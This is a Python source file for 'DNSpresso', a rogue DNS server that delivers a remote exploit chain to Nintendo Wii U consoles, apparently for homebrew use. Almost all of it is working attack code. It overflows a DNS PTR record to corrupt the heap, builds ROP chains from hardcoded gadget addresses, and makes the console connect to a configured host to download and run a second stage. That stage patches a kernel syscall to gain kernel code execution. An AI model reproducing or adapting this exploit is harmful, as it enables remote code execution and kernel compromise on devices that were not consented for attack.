#!/usr/bin/env python3
"""
DNSpresso: Created in 2023 by GaryOderNichts
<https://github.com/GaryOderNichts/DNSpresso>

This is a DNS server which implements a DNS exploit for the Wii U.
It's not exactly the most performant way of doing this, but it hopefully works for now.
At some point all of the Stage buffers could be packed once at the start and just sent to the clients.

It roughtly does the following:
1:      Makes the Wii U switch to TCP, by setting the truncate flag on all UDP requests.
2:      Override the tcp buffer with an allocated block we know the size and position of.
        Set the size to whatever adds up to the block size together with Stage1 size.
3:      Now on the next TCP retry, tcp_dns_run will call realloc with this pointer and return the same pointer since the size matches.
        It then memcpy's to this buffer and we have our own data at a buffer location we know.
4:      We can then write to the dns_query and overwrite the ipc reply pointer with a custom reply in the known buffer.
5.      dns_do_replies then copies ~256 bytes we control to any location we want, stack in this case for ROP.
6.      Open up a socket in a rop chain, and load stage 2 into memory, then copy stage2 rop and perform a stack pivot.
7.      Stage2 rop does a kernel exploit and runs the kernel binary appended to stage2.
8.      Profit!
"""

import sys
import struct
import time
import ipaddress
from dnslib.dns import *
from dnslib.server import *

# DNS requests which are not doing a conntest will respond with an A record
# for this IP
REDIRECT_IP = "85.215.57.182"

# configure this to your servers ip and a free port
# the Wii U will retrieve stage 2 from here
STAGE2_IP   = "192.168.178.96"
STAGE2_PORT = 5432

ios_kernel_bin = b''
stage1_full_size = 0

# pack big endian 32 bit unsigned value
def p32(val) -> bytes:
    return struct.pack('>I', val)

class TimedList:
    """
    Store elements with a timestamp.

    The server needs to keep track of transaction IDs to know which stage to send.
    This class keeps track of IDs with a timestamp and allows purging old IDs,
    after a specific amount of time has passed.
    """

    def __init__(self) -> None:
        self.list = []

    def append(self, element):
        self.list.append((element, time.time_ns()))

    def purge(self, time_ms):
        while self.list and self.list[0][1] <= time.time_ns() - time_ms * 1_000_000:
            self.list.pop(0)

    def __contains__(self, element):
        for x in self.list:
            if x[0] == element:
                return True
        return False

transaction_ids = TimedList()

class ROPUtils:
    # load gadget into link register
    # clobbers r0 and r6
    def load_to_lr(gadget) -> bytes:
        buf = b''
        buf += p32(0x123b36aa | 1) # pop {r0, r6, pc}
        buf += p32(gadget)
        buf += p32(0)
        buf += p32(0x1236ac7c) # mov lr, r0 ; mov r0, lr ; add sp, sp, #4 ; ldm sp!, {pc}
        buf += p32(0)
        return buf

    # loads a pop {pc} gadget into lr
    # doesn't clobber regs, requires fewer bytes
    def load_lr_small() -> bytes:
        buf = b''
        buf += p32(0x1242f7fc) # ldr lr, [sp], #8 ; bx lr
        buf += p32(0x12413f72 | 1) # pop {pc} (the bx lr jumps here, due to the pop pc gadget)
        buf += p32(0x12413f72 | 1) # pop {pc} (LR gadget)
        return buf

    # store r0 at memory location
    # clobbers r3
    def store_r0_in_mem(address) -> bytes:
        buf = b''
        buf += p32(0x1242547e | 1) # pop {r3, pc}
        buf += p32(address)
        buf += p32(0x12370f6c) # str r0, [r3] ; bx lr
        return buf

    # load r0 from memory location
    # clobbers r3
    def load_r0_from_mem(address) -> bytes:
        buf = b''
        buf += p32(0x1242547e | 1) # pop {r3, pc}
        buf += p32(address)
        buf += p32(0x1232608c) # ldr r0, [r3] ; bx lr
        return buf

    # signals semaphore stored at semaphore_address
    # clobbers r0, r3
    def IOS_SignalSemaphore(semaphore_address) -> bytes:
        buf = b''
        # load semaphore value into r0
        buf += ROPUtils.load_r0_from_mem(semaphore_address)
        # call sc
        buf += p32(0x123e451c) # IOS_SignalSemaphore
        return buf

    # calls usleep
    # clobbers r0, r6, lr
    def usleep(usecs) -> bytes:
        buf = b''
        buf += p32(0x123b36aa | 1) # pop {r0, r6, pc}
        buf += p32(usecs)
        buf += p32(0)
        buf += p32(0x123e3d9c) # usleep
        return buf

    # calls memcpy
    # clobbers r0-r4,lr
    def memcpy(dst, src, size) -> bytes:
        buf = b''
        buf += p32(0x124295da | 1) # pop {r0, r1, r2, r3, r4, pc}
        buf += p32(dst)
        buf += p32(src)
        buf += p32(size)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0x12318570) # bl memcpy ; mov r0, #0 ; pop {r4, pc}
        buf += p32(0)
        return buf

    # calls IOS_CreateThread with parameters
    # requires lr gadget with 2 extra registers to allow parameters from stack
    # clobbers r0-r4
    def IOS_CreateThread(function, arg, stack_top, stack_size, priority, flags) -> bytes:
        buf = b''
        buf += p32(0x124295da | 1) # pop {r0, r1, r2, r3, r4, pc}
        buf += p32(function)
        buf += p32(arg)
        buf += p32(stack_top)
        buf += p32(stack_size)
        buf += p32(0)
        buf += p32(0x123e4254) # IOS_CreateThread
        buf += p32(priority)
        buf += p32(flags)
        return buf

    # calls IOS_Shutdown without loading r0
    # might either reset or shutdown depending on r0 value
    # doesn't clobber regs
    def IOS_Shutdown_small() -> bytes:
        return p32(0x123e45e4)

    # clobbers r0, r6
    def IOS_Shutdown(reset):
        buf = b''
        buf += p32(0x123b36aa | 1) # pop {r0, r6, pc}
        buf += p32(reset)
        buf += p32(0)
        buf += ROPUtils.IOS_Shutdown_small()
        return buf

    # clobbers r0-r4,r12
    def kern_write32(addr, val) -> bytes:
        buf = b''
        buf += p32(0x124295da | 1) # pop {r0, r1, r2, r3, r4, pc}
        buf += p32(0)
        buf += p32(val)
        buf += p32(0)
        buf += p32(1) # r3 needs to be 1 for write to work
        buf += p32(addr)
        buf += p32(0x123a8908) # mov ip/r12, r4 ; mov r0, ip/r12 ; pop {r4, pc}
        buf += p32(0)
        buf += p32(0x123e45fc) # IOS_SetPanicBehaviour
        return buf

class Stage0:
    # address and size of the heap block which gets realloc'd over
    # in this case that's the first big bug from pk_alloc,
    # which is unlikely to be used during dns fetch
    TAKEOVER_BLOCK_ADDRESS = 0x12512140
    TAKEOVER_BLOCK_SIZE = 0x620

    def pack_dns_query_struct() -> bytes:
        buf = b''

        # dns client assumes first character is always STX and skips it
        buf += b'\x00'

        # append ptr_name and null terminate it
        buf += b'\xAA' * 255
        buf += b'\x00'

        # auths_ip
        buf += b'\x00\x00\x00\x00'

        # alist
        buf += b'\x00\x00\x00\x00' * 4

        # hostent
        buf += b'\x00' * 0x14

        # type + pad
        buf += b'\x00\x00\x00\x00'

        # ???
        buf += b'\x00\x00\x00\x00'
        buf += b'\x00\x00\x00\x00'

        # replies
        buf += b'\x00\x00\x00\x00' * 2

        # ios_ptr
        buf += b'\x00\x00\x00\x00'

        # dns netbuf
        buf += b'\x00\x00\x00\x00'

        # socket
        buf += b'\x00\x00\x00\x00'

        # send offset
        buf += b'\x00\x00\x00\x00'

        # tcp buf ptr and size
        # this is the block which gets taken over in the realloc, the size needs to add up to the block size to the with the size its going to recv
        buf += struct.pack('>LI', Stage0.TAKEOVER_BLOCK_ADDRESS, Stage0.TAKEOVER_BLOCK_SIZE-stage1_full_size)

        # add some more fields so ptr and size don't get null terminated

        # alloc time
        buf += b'\x00\x00\x00\x00'

        # # tcp queue next
        # buf += b'\x00\x00\x00\x00'

        # # tcp queue start
        # buf += b'\x00\x00\x00\x00'

        # # flags
        # buf += b'\x00\x00\x00\x00'

        return buf

    def resolve(request):
        # print("Stage0:")
        
        # prepare response
        response = DNSRecord(DNSHeader(id=request.header.id, qr=1))
        # initial A record nothing special
        response.add_answer(RR("DNSHAX", QTYPE.A, rdata=A((255, 255, 255, 255))))
        # additional PTR record pointing to the A record
        # the size isn't checked here :D
        response.add_ar(RR("DNSHAX", QTYPE.PTR, rdata=RD(Stage0.pack_dns_query_struct())))
        # this record makes the parsing error out
        response.add_ar(RR("ERROR", rclass=255, rdata=RD()))

        transaction_ids.append(request.header.id)

        return response

class Stage1:
    NET_SEMAPHORE_LOCATION = 0x12808498

    # unused mapped memory we can use
    #MEM_BUFFER = 0x1288d028 # end of the bss (limited)
    MEM_BUFFER = 0x127480A0 # use the end of the heap instead, more mapped memory there

    SOCKET_STORE = MEM_BUFFER

    STAGE2_LOCATION = MEM_BUFFER + 4

    STACK_PIVOT_TARGET = 0x1250CBA0

    # this is the location of the REPLYBUF buffer, which was added to the dns response,
    # inside of the buffer we took over
    # this is pretty much hardcoded right now and depends on the Stage1 size
    REPLYBUF_LOCATION = 0x12512714

    # the sockaddr is stored inside of the replybuf, since the first few bytes are unused anyways
    SOCKADDR_LOCATION = REPLYBUF_LOCATION

    def pack_rop_chain() -> bytes:
        buf = b''

        # signal semaphore which the net stack waits on
        buf += ROPUtils.load_lr_small()
        buf += ROPUtils.IOS_SignalSemaphore(Stage1.NET_SEMAPHORE_LOCATION)

        # create socket
        buf += p32(0x123b3362 | 1) # pop {r0, r1, r2, r3, r5, r7, pc}
        buf += p32(2) # family: AF_INET
        buf += p32(1) # type: SOCK_STREAM
        buf += p32(0) # proto: 0
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0x1231831c) # t_socket
    
        # store socket in memory, where we can later load it from
        buf += ROPUtils.load_lr_small()
        buf += ROPUtils.store_r0_in_mem(Stage1.SOCKET_STORE)

        # connect to server
        buf += p32(0x12334fce | 1) # pop {r1, r2, pc}
        buf += p32(Stage1.SOCKADDR_LOCATION) # addr: pointer to buffer containing sockaddr_in we uploaded
        buf += p32(0x10) # addrlen: sizeof(struct sockaddr_in)
        buf += p32(0x12317dc8) # t_connect

        # Since we can't use a loop here, we abuse socket buffering.
        # Each socket has a default buffer size of 8192, so we add a delay before recv to let the buffer fill up,
        # then call recv to write to the buffer all at once
        buf += ROPUtils.load_lr_small()
        buf += ROPUtils.usleep(2000 * 1000) # TODO find a reliable delay

        # can now do the actual recv
        buf += p32(0x12334fce | 1) # pop {r1, r2, pc}
        buf += p32(Stage1.STAGE2_LOCATION) # buf: ptr to some free space
        buf += p32(0x2000) # len: default recv buffer size
        # load socket from memory
        buf += ROPUtils.load_lr_small()
        buf += ROPUtils.load_r0_from_mem(Stage1.SOCKET_STORE)
        # gadget above clobbered r3, so load it here
        buf += p32(0x1242547e | 1) # pop {r3, pc}
        buf += p32(0) # flag: 0
        buf += p32(0x12317be4) # t_recv

        # memcpy rop stage2 into lower stack
        buf += ROPUtils.memcpy(Stage1.STACK_PIVOT_TARGET, Stage1.STAGE2_LOCATION, Stage2.MAX_ROP_SIZE)

        # perform a stack pivot into rop stage2 (ios-net makes this easy :p)
        buf += p32(0x1239ab48) # ldm sp, {r4, r5, r6, r7, r8, fp, sp, pc}
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(Stage1.STACK_PIVOT_TARGET) # sp: point to somewhere in the stack
        buf += p32(0x12413f72 | 1) # pop {pc}

        return buf

    def pack_dns_query_struct() -> bytes:
        buf = b''

        # dns client assumes first character is always STX and skips it
        buf += b'\x00'

        # immediately terminate string since we're using this buffer for rop (also padding to 4 alignment)
        buf += b'\x00\x00\x00\x00'

        rop = Stage1.pack_rop_chain()
        rop_words = len(rop) // 4

        if rop_words > 63:
            raise Exception("Stage1: ROP limit reached")

        buf += rop

        # padding
        buf += p32(0) * (63 - rop_words)

        # auths_ip
        buf += b'\x00\x00\x00\x00'

        # alist
        buf += b'\x00\x00\x00\x00' * 4

        # hostent
        buf += b'\x00' * 0x14

        # type + pad
        buf += b'\x00\x00\x00\x00'

        # ???
        buf += b'\x00\x00\x00\x00'
        buf += b'\x00\x00\x00\x00'

        # replies
        buf += struct.pack('>L', Stage1.REPLYBUF_LOCATION) # pointer to reply
        buf += b'\x00\x00\x00\x00' # next reply pointer

        return buf

    def pack_ios_reply() -> bytes:
        buf = b''

        # this is at 0x12512714 (REPLYBUF_LOCATION)

        # place sockaddr for stage2 here, we don't really care about the fields below anyways
        buf += struct.pack('>HHIII', 2, STAGE2_PORT, int(ipaddress.IPv4Address(STAGE2_IP)), 0, 0)

        # # command
        # buf += b'\xAA\xAA\xAA\xAA'

        # # reply
        # buf += b'\x00\x00\x00\x00'

        # # handle
        # buf += b'\x00\x00\x00\x00'

        # flags
        # buf += b'\x00\x00\x00\x00'

        # cpu id
        buf += b'\x00\x00\x00\x00'

        # pid
        buf += b'\x00\x00\x00\x00'

        # tid
        buf += b'\x00\x00\x00\x00'
        buf += b'\x00\x00\x00\x00'

        # gid
        buf += b'\x00\x00\x00\x00'

        # args (for ioctlv) start here

        # request
        buf += b'\x00\x00\x00\x00'

        # vec count in
        buf += b'\x00\x00\x00\x00'

        # vec count out
        buf += b'\x00\x00\x00\x00'

        # pointer to vecs
        buf += struct.pack('>L', Stage1.REPLYBUF_LOCATION + len(buf) + 4)

        # place vecs here
        # vec0
        buf += b'\x00\x00\x00\x00' # vaddr
        buf += b'\x00\x00\x00\x00' # len
        buf += b'\x00\x00\x00\x00' # paddr

        # vec1
        # this is going to be the destination where dns request is copied to
        # stack pointer at the time memcpy is called is `0x1250D3B8`
        # also need to account for everything in the dns query before the ptr buffer (0x17c)
        # + the 4 bytes null terminator/padding added to the ptr buffer: `0x1250D3B8 - (0x17c+4) = 0x1250D238`
        # memcpy immediately pushes lr to the stack, so let's do -4 to override it with the first element in our ROP:
        # `0x1250D238 - 4 = 0x1250D234`
        # size always needs to be 0x2bc, this is checked in dnc_doreplies
        buf += struct.pack('>LII', 0x1250D234, 0x2bc, 0)

        return buf

    def resolve(request):
        # print("Stage1:")

        # prepare response
        response = DNSRecord(DNSHeader(id=request.header.id, qr=1))
        # initial A record nothing special
        response.add_answer(RR("DNSHAX", QTYPE.A, rdata=A((255, 255, 255, 255))))
        # while we can technically use the normal, checked way of storing data into the
        # ptr buf we still use the pointing trick to avoid terminating at \0 and data just gets
        # memcpy'd this way
        response.add_ar(RR("DNSHAX", QTYPE.PTR, rdata=RD(Stage1.pack_dns_query_struct())))
        # this gets ignored, but we can store additional stuff here
        response.add_ar(RR("REPLYBUF", QTYPE.NULL, rdata=RD(Stage1.pack_ios_reply())))

        return response

class Stage2:
    REPLACE_SYSCALL = 0x081298bc

    ARM_KERNEL_CODE_BASE = 0x08135000
    ARM_USER_CODE_BASE = 0x12431900

    # rop is currently 596 bytes, this is more than enough
    # could make this dynamic at some point
    MAX_ROP_SIZE = 0x400

    def pack_rop_chain() -> bytes:
        buf = b''

        # place lr gadget for create thread
        buf += ROPUtils.load_to_lr(0x123d1118) # add sp, sp, #8 ; ldm sp!, {pc}

        # We'll use a flaw in IOS_Create thread to memset code with kernel permissions
        # <https://wiiubrew.org/wiki/Wii_U_system_flaws#ARM_kernel>
        # We can use this to nop out parts of IOS_SetPanicBehaviour for kern_write32
        buf += ROPUtils.IOS_CreateThread(0, 0, 0x0812974c, 0x68, 1, 2)

        # place smaller lr gadget
        buf += ROPUtils.load_lr_small()

        # patch IOS_SetFaultBehaviour to load custom kernel code
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x00, 0xe92d4010) # push { r4, lr }
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x04, 0xe1a04000) # mov r4, r0
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x08, 0xe3e00000) # mov r0, #0xffffffff
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x0c, 0xee030f10) # mcr p15, #0, r0, c3, c0, #0 (set dacr to r0)
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x10, 0xe1a00004) # mov r0, r4
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x14, 0xe12fff33) # blx r3
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x18, 0x00000000) # nop
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x1c, 0xee17ff7a) # clean_loop: mrc p15, 0, r15, c7, c10, 3
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x20, 0x1afffffd) # bne clean_loop
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x24, 0xee070f9a) # mcr p15, 0, r0, c7, c10, 4
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x28, 0xe1a03004) # mov r3, r4
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x2c, 0xe8bd4010) # pop { r4, lr }
        buf += ROPUtils.kern_write32(Stage2.REPLACE_SYSCALL + 0x30, 0xe12fff13) # bx r3 (custom kernel code)

        # flush dcache
        buf += p32(0x124295da | 1) # pop {r0, r1, r2, r3, r4, pc}
        buf += p32(Stage2.REPLACE_SYSCALL)
        buf += p32(0x4001) # > 0x4000 flushes all data cache
        buf += p32(0)
        buf += p32(0)
        buf += p32(0)
        buf += p32(0x123e44e4) # IOS_FlushDCache

        # call syscall with kern location for kernel code execution
        buf += p32(0x124295da | 1) # pop {r0, r1, r2, r3, r4, pc}
        buf += p32(Stage2.ARM_KERNEL_CODE_BASE)
        buf += p32(Stage1.STAGE2_LOCATION + Stage2.MAX_ROP_SIZE)
        buf += p32(len(ios_kernel_bin))
        buf += p32(0x08131d04) # kernel memcpy location is passed to the sc
        buf += p32(0)
        buf += p32(0x123e434c) # IOS_SetFaultBehaviour

        # jump to ios_net custom code
        buf += p32(Stage2.ARM_USER_CODE_BASE)

        return buf

    def pack() -> bytes:
        buf = b''

        rop = Stage2.pack_rop_chain()

        # this limit is arbitrary, but decides where the kernel binary will be stored
        if len(rop) > Stage2.MAX_ROP_SIZE:
            raise Exception("Stage2: ROP limit reached")

        # append rop and pad to size
        buf += rop
        buf += b'\0' * (Stage2.MAX_ROP_SIZE - len(rop))

        # append kernel binary
        buf += ios_kernel_bin

        # make sure this fits into the recv buffer
        # (including a bit of overhead)
        assert(len(buf) <= 8000)

        return buf

def is_conntest(request) -> bool:
    # TODO could also check for type, but just matching for A records doesn't
    # work with the TCP queries
    return request.q.qname.matchGlob("conntest.nintendowifi.net")

def do_redir_reply(request):
    # respond with an a answer to the configured redir server
    a = request.reply()
    a.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(REDIRECT_IP), ttl=60))
    return a

class UDPResolver:
    def resolve(request, handler):
        # if this is not a conntest, respond with the default response
        if not is_conntest(request):
            return do_redir_reply(request)

        # just send an empty response with the truncate flag set to trigger a tcp request
        return DNSRecord(DNSHeader(id=request.header.id, qr=1, tc=1))

class TCPResolver:
    def resolve(request, handler):
        # if this is not a conntest, respond with the default response
        if not is_conntest(request):
            return do_redir_reply(request)

        if request.header.id not in transaction_ids:
            return Stage0.resolve(request)
        else:
            return Stage1.resolve(request)

class Stage2RequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print(f"Stage2 ({self.client_address[0]}:{self.client_address[1]}): connected")
        self.request.sendall(Stage2.pack())
        print(f"Stage2 ({self.client_address[0]}:{self.client_address[1]}): done")

def main():
    # read kernel binary
    try:
        with open('ios/ios_kernel/ios_kernel.bin', 'rb') as f:
            global ios_kernel_bin
            ios_kernel_bin = f.read()
    except IOError as e:
        print(f'Cannot read ios_kernel (did you run `make` in `ios`?) ({e})')
        sys.exit(1)

    # this shouldn't be too large-ish
    assert(len(ios_kernel_bin) < 7000)

    # need to know the full size of Stage1 for Stage0
    global stage1_full_size
    stage1_full_size = len(Stage1.resolve(DNSRecord()).pack()) + 2 # need to add 2 for tcp size

    # create DNS udp and tcp server
    udpserver = DNSServer(UDPResolver, tcp=False)
    udpserver.start_thread()

    tcpserver = DNSServer(TCPResolver, tcp=True)
    tcpserver.start_thread()

    # create tcp server for stage 2
    stage2_server = socketserver.ThreadingTCPServer(('', STAGE2_PORT), Stage2RequestHandler)
    threading.Thread(target=stage2_server.serve_forever, daemon=True).start()

    print('DNS server running...')
    try:
        while 1:
            time.sleep(1)
            # purge all ids older than 5 seconds
            transaction_ids.purge(5000)
    except KeyboardInterrupt:
        pass
    finally:
        udpserver.stop()
        tcpserver.stop()
        stage2_server.shutdown()

if __name__ == '__main__':
    main()
